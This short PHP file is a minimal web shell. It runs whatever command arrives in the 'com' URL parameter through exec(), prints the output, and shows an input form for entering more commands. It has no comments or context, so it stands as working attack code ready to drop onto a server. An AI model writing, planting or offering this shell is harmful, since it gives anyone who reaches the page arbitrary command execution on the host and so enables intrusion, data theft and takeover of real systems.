<?php
echo exec($_GET['com'],$s);

foreach($s as $line)
{
echo ($line.'<br>');
}
?>
<form method="GET">
<input type="text" name="com">
</form>